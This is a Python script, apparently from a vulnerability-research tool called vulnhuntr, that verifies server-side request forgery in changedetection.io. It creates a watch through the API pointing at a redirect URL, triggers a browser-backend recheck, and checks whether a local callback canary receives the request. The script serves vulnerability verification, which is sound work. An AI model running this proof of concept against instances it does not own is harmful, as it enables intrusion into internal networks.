import argparse
import json
import os
import sys
from pathlib import Path
from typing import Any
from urllib import error, request

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from vulnhuntr.candidate import Candidate
from vulnhuntr.ssrf_verifier import verify_ssrf


MODES = ("browser-redirect", "notification-redirect")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Skeleton runner for changedetection.io SSRF verifier experiments. "
            "Does not start changedetection.io or Docker."
        )
    )
    parser.add_argument("--target-base-url", required=True, help="Base URL of an already-running changedetection.io instance.")
    parser.add_argument("--mode", required=True, choices=MODES, help="Experiment mode to prepare.")
    parser.add_argument(
        "--api-key",
        default=None,
        help="changedetection.io API key. Defaults to CHANGEDETECTION_API_KEY.",
    )
    parser.add_argument("--dry-run", action="store_true", help="Print planned API calls without contacting the target.")
    cleanup = parser.add_mutually_exclusive_group()
    cleanup.add_argument("--cleanup", dest="cleanup", action="store_true", help="Delete the created watch after triggering.")
    cleanup.add_argument("--no-cleanup", dest="cleanup", action="store_false", help="Leave the created watch in place.")
    parser.set_defaults(cleanup=True)
    parser.add_argument("--timeout", type=float, default=5.0, help="Callback wait timeout in seconds.")
    return parser


def make_candidate(mode: str) -> Candidate:
    return Candidate(
        file="changedetection.io",
        line=0,
        sink_type="ssrf",
        semgrep_rule_id=f"manual.changedetection.{mode}",
        code_snippet="manual SSRF guard parity experiment",
        enclosing_symbol=mode,
        enclosing_source="manual experiment skeleton",
    )


def _api_url(target_base_url: str, path: str) -> str:
    return f"{target_base_url.rstrip('/')}{path}"


def _http_json(method: str, url: str, api_key: str, payload: dict[str, Any] | None = None) -> tuple[int, Any]:
    data = None
    headers = {"x-api-key": api_key}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"

    req = request.Request(url, data=data, headers=headers, method=method)
    with request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8")
        if not body:
            return resp.status, None
        try:
            return resp.status, json.loads(body)
        except json.JSONDecodeError:
            return resp.status, body


def build_browser_redirect_payload(redirect_url: str) -> dict[str, Any]:
    return {
        "url": redirect_url,
        "title": "vulnhuntr SSRF browser redirect experiment",
        "fetch_backend": "html_webdriver",
        "time_between_check": {"seconds": 3},
    }


def make_browser_redirect_poc(api_key: str, cleanup: bool = True):
    def browser_redirect_poc(target_base_url: str, callback_url: str, redirect_url: str) -> int:
        del callback_url
        watch_uuid = None
        try:
            status, body = _http_json(
                "POST",
                _api_url(target_base_url, "/api/v1/watch"),
                api_key,
                build_browser_redirect_payload(redirect_url),
            )
            if status not in (200, 201) or not isinstance(body, dict) or not body.get("uuid"):
                return 1

            watch_uuid = body["uuid"]
            status, _body = _http_json(
                "GET",
                _api_url(target_base_url, f"/api/v1/watch/{watch_uuid}?recheck=true"),
                api_key,
            )
            return 0 if 200 <= status < 300 else 1
        except (OSError, error.URLError, error.HTTPError, ValueError):
            return 1
        finally:
            if cleanup and watch_uuid:
                try:
                    _http_json("DELETE", _api_url(target_base_url, f"/api/v1/watch/{watch_uuid}"), api_key)
                except (OSError, error.URLError, error.HTTPError, ValueError):
                    pass

    return browser_redirect_poc


def notification_redirect_poc(target_base_url: str, callback_url: str, redirect_url: str) -> int:
    raise NotImplementedError(
        "notification-redirect PoC is not implemented until notification API/auth payload details are confirmed."
    )


def poc_for_mode(mode: str):
    if mode == "browser-redirect":
        raise ValueError("browser-redirect PoC requires make_browser_redirect_poc(api_key, cleanup).")
    if mode == "notification-redirect":
        return notification_redirect_poc
    raise ValueError(f"Unsupported mode: {mode}")


def print_browser_redirect_dry_run(target_base_url: str, cleanup: bool) -> None:
    redirect_url = "http://127.0.0.1:<callback-port>/redirect/<token>?to=http%3A%2F%2F127.0.0.1%3A<callback-port>%2Fcanary%2F<token>"
    payload = build_browser_redirect_payload(redirect_url)
    print("Dry run: no target requests will be sent and no callback server will be started.")
    print("Planned calls:")
    print(f"- POST {_api_url(target_base_url, '/api/v1/watch')}")
    print(f"  payload: {json.dumps(payload, sort_keys=True)}")
    print("- GET <target-base-url>/api/v1/watch/<uuid>?recheck=true")
    if cleanup:
        print("- DELETE <target-base-url>/api/v1/watch/<uuid>")
    else:
        print("- cleanup disabled; created watch would be left in place")


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.mode == "notification-redirect":
        print("notification-redirect is not implemented pending UI session/CSRF and Apprise scheme details.", file=sys.stderr)
        return 2

    api_key = args.api_key or os.environ.get("CHANGEDETECTION_API_KEY")
    if not api_key:
        print("Missing API key: pass --api-key or set CHANGEDETECTION_API_KEY.", file=sys.stderr)
        return 2

    if args.dry_run:
        print_browser_redirect_dry_run(args.target_base_url, args.cleanup)
        return 0

    candidate = make_candidate(args.mode)
    poc = make_browser_redirect_poc(api_key, cleanup=args.cleanup)
    result = verify_ssrf(candidate, args.target_base_url, poc, wait_timeout=args.timeout)
    print(result.status)
    print(result.evidence)
    return 2 if result.status == "false_positive" else 0


if __name__ == "__main__":
    raise SystemExit(main())
